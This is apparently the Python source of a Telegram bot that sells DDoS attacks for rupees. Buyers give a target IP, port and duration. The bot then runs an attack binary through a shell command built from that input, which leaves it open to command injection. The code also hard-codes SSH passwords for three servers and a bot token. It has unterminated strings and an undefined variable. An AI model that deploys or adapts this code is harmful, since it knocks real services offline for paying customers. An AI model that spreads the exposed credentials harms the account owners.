
import paramiko

VPS_CREDENTIALS = [
    {"ip": "155.138.136.219", "username": "master_ngmatkuyvr", "password": "98Cf7KqktBBs"},
    {"ip": "70.34.255.101", "username": "master_fptcarnpqt", "password": "jFtHtZf6swW4"},
    {"ip": "70.34.255.232", "username": "master_kvrbezzhav", "password": "seCR2Wn4YYhK"},
]

def check_vps_status(ip, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username=username, password=password, timeout=5)
        client.close()
        return True
    except Exception as e:
        return False


def run_command_on_vps(ip, username, password, command):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username=username, password=password)
        stdin, stdout, stderr = client.exec_command(command)
        output = stdout.read().decode()
        error = stderr.read().decode()
        client.close()
        return output or error or "Command sent."
    except Exception as e:
        return f"SSH Error: {str(e)}"


#soulddoserpython

import telebot
import subprocess
import datetime
import os

# Insert your Telegram bot token here
bot = telebot.TeleBot('8013938312:AAH2wgu1Gsw29Lo5orDamDs3crFmJlHZYGE')

# Admin user IDs
admin_id = {"6321758394"}
USER_FILE = "users1.txt"
LOG_FILE = "log1.txt"

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

allowed_user_ids = read_users()

def log_command(user_id, king, soulking, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nking: {king}\nsoulking: {soulking}\nTime: {time}\n\n")

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ."
            else:
                file.truncate(0)
                response = "Logs cleared successfully âœ…"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

def record_command_logs(user_id, command, king=None, soulking=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if king:
        log_entry += f" | king: {king}"
    if soulking:
        log_entry += f" | soulking: {soulking}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully ðŸ‘."
            else:
                response = "User already exists ðŸ¤¦â€â™‚ï¸."
        else:
            response = "Please specify a user ID to add ðŸ˜’."
    else:
        response = "áµ€áµá´¹Ë¢á´± á´ºá´¬ á´´á´¼ á´¾á´¬Ê¸á´±á´³á´¬ðŸ¤£"

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully ðŸ‘."
            else:
                response = f"User {user_to_remove} not found in the list ."
        else:
            response = '''Please Specify A User ID to Remove. 
âœ… Usage: /remove <userid>'''
    else:
        response = "áµ€áµá´¹Ë¢á´± á´ºá´¬ á´´á´¼ á´¾á´¬Ê¸á´±á´³á´¬ðŸ¤£"

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully âœ…"
        except FileNotFoundError:
            response = "Logs are already cleared ."
    else:
        response = "ðŸ˜ŽðŸ‡² ðŸ‡ª  ðŸ‡° ðŸ‡·  ðŸ‡© ðŸ‡º ðŸ‡³ ðŸ‡¬ ðŸ‡¦  ðŸ‡¹ ðŸ‡º ðŸ‡²  ðŸ‡§ ðŸ‡¸  ðŸ‡° ðŸ‡­ ðŸ‡ª ðŸ‡± ðŸ˜Ž"
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found "
        except FileNotFoundError:
            response = "No data found "
    else:
        response = "TÌŠâ«¶UÌŠâ«¶ AÌŠâ«¶PÌŠâ«¶NÌŠâ«¶AÌŠâ«¶ DÌŠâ«¶EÌŠâ«¶KÌŠâ«¶HÌŠâ«¶ NÌŠâ«¶AÌŠâ«¶ BÌŠâ«¶HÌŠâ«¶AÌŠâ«¶IÌŠâ«¶"
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ."
                bot.reply_to(message, response)
        else:
            response = "No data found "
            bot.reply_to(message, response)
    else:
        response = "áµ€áµá´¹Ë¢á´± á´ºá´¬ á´´á´¼ á´¾á´¬Ê¸á´±á´³á´¬ðŸ¤£"
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"ðŸ¤–Your ID: {user_id}"
    bot.reply_to(message, response)

def start_attack_reply(message, king, soulking, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, âœ…ðŸ”¥ð˜¾ð™Šð™‰ð™‚ð™ð˜¼ð™ð™ð™‡ð˜¼ð™ð™„ð™Šð™‰ð™ŽðŸ”¥âœ…\n\nð“ðšð«ð ðžð­: {king}\nðð¨ð«ð­: {soulking}\nð“ð¢ð¦ðž: {time} ð’ðžðœð¨ð§ðð¬\nðŒðžð­ð¡ð¨ð: soul\n\nðŸŒŸ DDOS LAGADO OFFICIAL..!ðŸ’€"
    bot.reply_to(message, response)

soul_cooldown = {}

COOLDOWN_TIME =0

@bot.message_handler(commands=['soul'])
def handle_soul(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if user_id not in admin_id:
            
            if user_id in soul_cooldown and (datetime.datetime.now() - soul_cooldown[user_id]).seconds < 3:
                response = "You Are On Cooldown . Please Wait 5min Before Running The /soul Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            soul_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  
            king = command[1]
            soulking = int(command[2])  
            time = int(command[3])  
            if time > 181:
                response = "Error: Time interval must be less than 80."
            else:
                record_command_logs(user_id, '/soul_compiled', king, soulking, time)
                log_command(user_id, king, soulking, time)
                start_attack_reply(message, king, soulking, time)  
                full_command = f"./swarg {king} {soulking} {time} 100"
                subprocess.run(full_command, shell=True)
                response = f"-æ¼«~*'Â¨Â¯Â¨'*Â·èˆž~ ðŸ‡®ðŸ‡³Ä…É¬É¬Ä…ÆˆÆ™ ÆˆÆ¡É±â„˜Æ–É›É¬É›É–ðŸ‡®ðŸ‡³ ~èˆž*'Â¨Â¯Â¨'*Â·~æ¼«- king: {king} soulking: {soulking} soulking: {time}"
        else:
            response = "âœ…AÍ¢vÍ¢aÍ¢iÍ¢lÍ¢aÍ¢bÍ¢lÍ¢eÍ¢ rÍ¢iÍ¢gÍ¢hÍ¢tÍ¢ nÍ¢oÍ¢wÍ¢âœ… :- /soul <king> <soulking> <time>"  
    else:
        response = " ãƒŸðŸ¥¹â˜… ð˜ˆð˜¤ð˜¤ð˜¦ð˜´ð˜´ ð˜­ð˜¦ ð˜­ð˜¦ ð˜£ð˜³ð˜° â˜…ðŸ¥¹å½¡DM - @SOULCRACK ."

    bot.reply_to(message, response)



@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = " No Command Logs Found For You ."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "áµ€áµá´¹Ë¢á´± á´ºá´¬ á´´á´¼ á´¾á´¬Ê¸á´±á´³á´¬ðŸ¤£"

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''ðŸ¤– Available commands:
ðŸ’¥ /soul : Method For soul Servers. 
ðŸ’¥ /rules : Please Check Before Use !!.
ðŸ’¥ /mylogs : To Check Your Recents Attacks.
ðŸ’¥ /plan : Checkout Our Botnet Rates.

ðŸ¤– To See Admin Commands:
ðŸ’¥ /admincmd : Shows All Admin Commands.

'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''Ä±llÄ±llÄ±â­ðŸŒŸ WÍ™eÍ™lÍ™cÍ™oÍ™mÍ™eÍ™ tÍ™oÍ™ soul family â£ï¸ ðŸŒŸâ­Ä±llÄ±llÄ± \n {user_name}! \nðŸ„±ðŸ„¶ðŸ„¼ðŸ„¸ ðŸ„ºðŸ„¸ ðŸ„¶ðŸ„°ðŸ„½ðŸ„³ ðŸ„¼ðŸ„°ðŸ…ðŸ„½ðŸ„´ ðŸ„°ðŸ„° ðŸ„¶ðŸ…ˆðŸ„´ðŸ˜œ
ðŸ¤–Try To Run This Command : /help 
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules âš ï¸:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
3. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, ðŸŽ¯å½¡[Ê™Ê€á´á´›Êœá´‡Ê€ á´É´ÊŸÊ 1 á´˜ÊŸá´€É´ Éªêœ± á´˜á´á´¡á´‡Ê€êœ°á´œÊŸÊŸ á´›Êœá´‡É´ á´€É´Ê á´á´›Êœá´‡Ê€ á´…á´…á´êœ±]å½¡ðŸŽ¯ !!:

Vip ðŸŒŸ :
-> Attack Time : 180 (S)
> After Attack Limit : 5 Min
-> Concurrents Attack : 3

Pr-ice ListðŸ’¸ :
Day-->100 Rs
Week-->600 Rs
Month-->1600 Rs
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

ðŸ’¥ /add <userId> : Add a User.
ðŸ’¥ /remove <userid> Remove a User.
ðŸ’¥ /allusers : Authorised Users Lists.
ðŸ’¥ /logs : All Users Logs.
ðŸ’¥ /broadcast : Broadcast a Message.
ðŸ’¥ /clearlogs : Clear The Logs File.
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "âš ï¸ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users ðŸ‘."
        else:
            response = "ðŸ¤– Please Provide A Message To Broadcast."
    else:
        response = "áµ€áµá´¹Ë¢á´± á´ºá´¬ á´´á´¼ á´¾á´¬Ê¸á´±á´³á´¬ðŸ¤£"

    bot.reply_to(message, response)





@bot.message_handler(commands=['vpsstatus'])
def check_all_vps_status(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        status_report = "ðŸ–¥ VPS Status Report:

"
        for vps in VPS_CREDENTIALS:
            status = "âœ… Online" if check_vps_status(vps["ip"], vps["username"], vps["password"]) else "âŒ Offline"
            status_report += f"{vps['ip']}: {status}
"
        bot.reply_to(message, status_report)
    else:
        bot.reply_to(message, "áµ€áµá´¹Ë¢á´± á´ºá´¬ á´´á´¼ á´¾á´¬Ê¸á´±á´³á´¬ðŸ¤£")

while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)